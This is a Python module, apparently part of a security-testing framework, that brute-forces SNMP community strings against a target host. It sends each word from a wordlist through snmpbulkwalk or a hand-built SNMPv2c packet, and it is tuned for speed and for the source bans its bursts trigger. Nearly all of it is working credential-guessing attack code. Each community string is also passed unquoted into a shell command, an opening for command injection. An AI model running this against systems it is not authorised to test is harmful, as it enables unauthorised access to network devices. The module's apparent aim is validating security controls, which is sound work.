"""SNMP community string brute force. Walks wordlists/snmp_communities.txt
(falls back to just 'public' if that file is missing), stopping at the
first community that gets real MIB data back — 'public' is deliberately
LAST in that wordlist: it's the one the old single-check version of this
module always tried, so landing on anything else FIRST is the more
interesting finding (a non-default string someone picked is still a
guessable one), and 'public' working is the unsurprising baseline case.

Uses snmpbulkwalk (GETBULK), not snmpwalk (one GETNEXT per OID). A
chatty target — routine for a Windows box: process list, TCP table,
interface stats, ... — can have a large enough MIB tree that walking it
one OID at a time takes minutes even with nothing wrong on the wire;
confirmed ~9-12x more throughput from switching to GETBULK against a lab
DC (a few hundred thousand bytes of MIB data), on top of the existing
-t3 -r1 fast-fail for a genuinely filtered/closed port. Packet loss on
the path makes the one-OID-at-a-time version even worse: every dropped
GETNEXT costs a full timeout+retry, and with hundreds of OIDs a couple
of drops alone adds minutes. (This module is serial + run_last — see
META — so it runs ALONE at the end, AFTER the DoS floods like
icmp_flood rather than overlapped with them; an earlier version lacked
those flags and ran in the parallel pool, where its own community burst
tripped an SNMP brute-force source-ban mid-walk and 'public' — tried
last — timed out, scoring a FALSE BLOCKED on a target that is actually
vulnerable. The GETBULK win still matters for a chatty target on any
lossy link.) GETBULK needs far fewer
round-trips for the same walk to begin with, so it's far less exposed
to that same loss in the first place. -t3 -r1 also means a full ~15-word
wordlist costs at most ~1-2 min before landing on (or exhausting) the
list — most of that only paid once, on the way to whichever community
actually works."""
import os
import re
import shutil
import socket
import struct

# ---- pure-stdlib SNMP v2c GET fallback (when snmpbulkwalk isn't installed) ----------
# A minimal BER builder + a GET for sysDescr.0 (1.3.6.1.2.1.1.1.0), parameterised by
# community. This is the same request the engine's recon SNMP probe uses (core._SNMP_GET),
# generalised to any community/version — NOT a new/unproven wire format. A reply with a
# value = the community is valid; silent/no reply = wrong community or filtered.
_SYSDESCR_OID = bytes.fromhex("2b06010201010100")   # 1.3.6.1.2.1.1.1.0
_SNMP_TYPE = {0x04: "STRING", 0x02: "INTEGER", 0x06: "OID", 0x40: "IpAddress",
              0x41: "Counter32", 0x42: "Gauge32", 0x43: "Timeticks", 0x44: "OPAQUE"}


def _ber_len(n):
    if n < 0x80:
        return bytes([n])
    b = b""
    while n:
        b = bytes([n & 0xFF]) + b
        n >>= 8
    return bytes([0x80 | len(b)]) + b


def _tlv(tag, val):
    return bytes([tag]) + _ber_len(len(val)) + val


def _snmp_get_packet(community, reqid):
    varbind = _tlv(0x30, _tlv(0x06, _SYSDESCR_OID) + _tlv(0x05, b""))
    pdu = _tlv(0xA0, _tlv(0x02, struct.pack(">I", reqid)) + _tlv(0x02, b"\x00")
               + _tlv(0x02, b"\x00") + _tlv(0x30, varbind))
    # version INTEGER 1 = SNMPv2c
    return _tlv(0x30, _tlv(0x02, b"\x01") + _tlv(0x04, community.encode("latin-1", "replace")) + pdu)


def _snmp_value(resp):
    """Extract the sysDescr value from a GET-RESPONSE as a net-snmp-style '= TYPE: val'
    string, or None if the reply carried no value for our OID."""
    i = resp.find(b"\x06\x08" + _SYSDESCR_OID)
    if i < 0:
        return None
    v = i + 10                      # past 06 08 + 8 OID bytes
    if v >= len(resp):
        return None
    tag = resp[v]
    ln = resp[v + 1]
    off = v + 2
    if ln & 0x80:                   # long-form length
        nb = ln & 0x7F
        ln = int.from_bytes(resp[off:off + nb], "big")
        off += nb
    val = resp[off:off + ln]
    if tag in (0x05,) or ln == 0:   # NULL / noSuchObject => no real value
        return None
    tname = _SNMP_TYPE.get(tag, "STRING")
    if tag == 0x04:
        txt = val.decode("latin-1", "replace")
    elif tag in (0x02, 0x41, 0x42, 0x43):
        txt = str(int.from_bytes(val, "big"))
    else:
        txt = val.hex()
    return "= %s: %s" % (tname, txt)


def _snmp_get_socket(target, port, community, ctx, timeout=3.0):
    """Send one SNMPv2c GET for sysDescr.0; return a net-snmp-style result line."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        try:
            ctx.bind_source(s)
        except Exception:
            pass
        s.settimeout(timeout)
        reqid = int.from_bytes(os.urandom(4), "big")
        s.sendto(_snmp_get_packet(community, reqid), (target, port))
        resp, _ = s.recvfrom(4096)
    except socket.timeout:
        return "Timeout: No Response from %s" % target
    except OSError as e:
        return "No Response (%s: %s)" % (e.__class__.__name__, e)
    finally:
        try:
            s.close()
        except OSError:
            pass
    val = _snmp_value(resp)
    if val:
        return "SNMPv2-MIB::sysDescr.0 %s" % val
    return "No Response (reply carried no value — wrong community or restricted view)"

META = {
    "id": "snmp_brute",
    "name": "SNMP Community Brute",
    "category": "Network Exploitation",
    "test_type": "va",
    "control": "Default-credential / community-string hygiene",
    "fix": "SD-WAN",
    "mitre": ['T1110.001'],
    "cwe": ['CWE-1392'],
    "tactic": 'Credential Access',
    "requires": [],          # snmpbulkwalk PREFERRED; pure-stdlib UDP SNMP GET fallback otherwise
    "ports": [("udp", 161)],
    "port_customizable": True,
    "serial": True,      # brute: run ALONE so its own community burst isn't skewed
    "run_last": True,    # the burst (public tried LAST) trips an SNMP community
                         #   brute-force signature that blacklists the SOURCE; run
                         #   last so the ban it causes can't contaminate the quiet
                         #   modules — AND so 'public' (the one that works) isn't
                         #   the attempt that lands after the source is already
                         #   banned (the false-BLOCKED this module used to hit).
    "order": 100,        # sticky source-blacklister tier, same as ssh_brute; after
                         #   the inline IPS-signature attacks (apache/log4shell/doh/…)
    # match a real net-snmp VALUE line ("... = STRING: ...") rather than a bare
    # type word — "OID" alone also appears inside error text ("...at this OID").
    "success_regex": r"= (STRING|INTEGER|Counter32|Gauge32|Timeticks|Hex-STRING|IpAddress|OID|OPAQUE):",
    "blocked_regex": r"Timeout|No Response|timed out",
}

WORDLIST = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "wordlists", "snmp_communities.txt")


def _load_communities():
    try:
        with open(WORDLIST) as f:
            words = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        return words or ["public"]
    except FileNotFoundError:
        return ["public"]  # wordlist missing -> fall back to the old single-check behaviour


def run(target, ctx):
    # -r1 (1 retry) so a filtered/closed UDP 161 resolves in ~6s instead of the
    # default ~30s (5 retries x timeout) — snmpbulkwalk is otherwise the long pole.
    port = ctx.get_port("snmp_brute", 161)   # overridable per-attack (GUI/env)
    agent = "{target}" if port == 161 else f"{{target}}:{port}"

    communities = _load_communities()
    use_cli = shutil.which("snmpbulkwalk") is not None
    engine = "snmpbulkwalk" if use_cli else "python UDP SNMPv2c GET fallback (snmpbulkwalk not installed)"
    out = [f"# SNMP community brute vs {target} — {len(communities)} communities "
           f"({engine}, 'public' tried last)"]

    for community in communities:
        out.append(f"\n--- trying community '{community}' ---")
        if use_cli:
            raw = ctx.run_cmd(f"snmpbulkwalk -v2c -c {community} -t3 -r1 {agent}", target)
        else:
            raw = _snmp_get_socket(target, port, community, ctx)
        out.append(raw)
        if re.search(META["success_regex"], raw):
            out.append(f"\n[+] SUCCESS: community string '{community}' is valid "
                       f"({'default/well-known' if community == 'public' else 'non-default, still guessable'})")
            return "\n".join(out)

    out.append(f"\n[-] All {len(communities)} communities tried — none returned valid MIB data")
    return "\n".join(out)
